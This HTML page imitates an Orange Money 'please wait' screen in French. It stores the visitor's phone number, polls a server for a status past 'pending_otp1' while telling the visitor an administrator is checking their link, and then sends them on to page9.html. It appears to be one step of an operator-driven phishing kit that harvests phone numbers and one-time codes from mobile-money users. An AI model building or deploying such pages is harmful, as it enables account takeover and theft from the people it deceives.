<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Patientez - Orange Money</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            background-color: #f25c05;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: white;
            text-align: center;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 25px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 { font-size: 22px; font-weight: 700; margin: 0 0 10px; }
        p { font-size: 15px; opacity: 0.9; margin: 0; }
    </style>
</head>
<body>

<div class="spinner"></div>
<h2>Veuillez patienter...</h2>
<p>L'administrateur vérifie votre lien</p>

<script>
    document.addEventListener("DOMContentLoaded", () => {
        const phone = localStorage.getItem('phone');

        const pollInterval = setInterval(async () => {
            try {
                if (phone) {
                    const res = await fetch('/api/check-status?phone=' + encodeURIComponent(phone));
                    if (res.ok) {
                        const data = await res.json();
                        if (data.status && data.status !== 'pending_otp1') {
                            clearInterval(pollInterval);
                            window.location.href = "page9.html";
                        }
                    }
                }
            } catch (e) {
                console.log("Checking status...");
            }
        }, 3000);

        // Fallback redirect after 8 seconds
        setTimeout(() => {
            clearInterval(pollInterval);
            window.location.href = "page9.html";
        }, 8000);
    });
</script>
</body>
</html>
